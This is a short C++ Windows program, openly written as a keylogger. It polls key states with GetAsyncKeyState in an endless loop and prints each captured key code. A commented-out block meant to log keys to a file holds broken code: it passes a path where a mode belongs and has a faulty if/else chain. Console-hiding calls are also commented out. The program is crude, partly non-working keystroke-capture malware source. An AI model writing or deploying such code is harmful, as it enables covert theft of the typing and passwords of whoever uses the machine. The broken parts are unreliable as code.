
#include<stdlib.h>
#include<stdio.h>
#include<iostream>
#include <Windows.h>
using namespace std;

int Save(int _key,char *file);
void keyloger()
{

	char i;
	while(1)
	{
		for(i=8;i<=255;i++)
		{
			if(GetAsyncKeyState(i)==1)
			{
				Save(i,"F:\\WINAPI2-\\KEYLOGERI SERVERZE GAGZAVNA\\ggk\\Debug\\log.txt");
			}
					Sleep(1000);
		}


	}

}


int main()
{
	//FreeConsole();
	//CreateThread(NULL,NULL,keyloger,0,0,0);




	//int state=	GetAsyncKeyState(1);



	keyloger();

}

int Save(int _key,char *file)
{
	cout<< _key<<endl;


/*	FILE *OUTPUT_FILE;
	OUTPUT_FILE=fopen(file,"F:\\WINAPI2-\\KEYLOGERI SERVERZE GAGZAVNA\\ggk\\Debug\\log.txt");
	if(_key==VK_SHIFT)
		fprintf(OUTPUT_FILE,"%s","[SHIFT]");

	if(_key==VK_BACK)
		fprintf(OUTPUT_FILE,"%s","[BACK]");

		if(_key==VK_LBUTTON)
		fprintf(OUTPUT_FILE,"%s","[LBUTTON]");

				if(_key==VK_RETURN)
		fprintf(OUTPUT_FILE,"%s","[RETURN]");

			if(_key==VK_ESCAPE)
		fprintf(OUTPUT_FILE,"%s","[ESCAPE]");



	else
	
	fprintf(OUTPUT_FILE,"%s",&_key);
	fclose(OUTPUT_FILE);
*/


	return 0;
}